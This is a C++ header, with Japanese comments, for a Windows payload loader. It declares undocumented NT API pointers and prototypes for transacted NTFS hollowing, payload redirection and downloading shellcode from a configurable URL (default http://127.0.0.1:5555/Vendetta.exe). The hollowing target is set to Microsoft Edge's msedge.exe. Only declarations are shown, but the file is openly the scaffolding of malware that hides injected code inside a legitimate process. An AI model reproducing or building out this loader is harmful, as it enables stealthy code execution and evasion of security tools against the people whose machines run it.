#pragma once

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <atlconv.h>
#include <UserEnv.h>
#include <wininet.h>
#include <vector>
#include <KtmW32.h>



#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "wininet.lib")



typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2

} SECTION_INHERIT;


#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L) 
#define STATUS_IMAGE_NOT_AT_BASE         ((NTSTATUS)0x40000003L)

// 各関数ポインタ型の宣言
using pRtlCreateProcessParametersEx = NTSTATUS(WINAPI*)(PRTL_USER_PROCESS_PARAMETERS* pProcessParameters, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
using pNtCreateProcessEx = NTSTATUS(WINAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, BOOLEAN InJob);
using pNtCreateThreadEx = NTSTATUS(WINAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
using pNtCreateSection = NTSTATUS(NTAPI*)(PHANDLE SectionHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG PageAttributes, ULONG SectionAttributes, HANDLE FileHandle);
using pNtSetInformationFile = NTSTATUS(WINAPI*)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
using pNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using pCreateProcessInternalW = BOOL(WINAPI*)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation, PHANDLE hNewToken);


// 各関数ポインタの外部宣言
extern pNtCreateProcessEx NtCreateProcessEx;
extern pNtCreateThreadEx NtCreateThreadEx;
extern pNtCreateSection NtCreateSection;
extern pNtSetInformationFile NtSetInformationFile;
extern pRtlCreateProcessParametersEx RtlCreateProcessParametersEx;
extern pNtMapViewOfSection NtMapViewOfSection;
extern pCreateProcessInternalW CreateProcessInternalW;


struct Arg {
    // URLのパーツを固定長バッファで確保
    wchar_t protocol[255] = L"http://";
    wchar_t ipAddress[255] = L"127.0.0.1";
    wchar_t port[255] = L"5555";
    wchar_t filePath[255] = L"Vendetta.exe";

    // 中空化するプログラムパス
    wchar_t targetProgramPath[255] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
};

void RedirectToPayload(PBYTE loadedPe, LPVOID baseAddress, PROCESS_INFORMATION& pi);
void TransactionNTFSHollowing(std::wstring targetPath, PBYTE payload, DWORD payloadSize);
std::wstring makeUrl(const Arg& arg);
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode);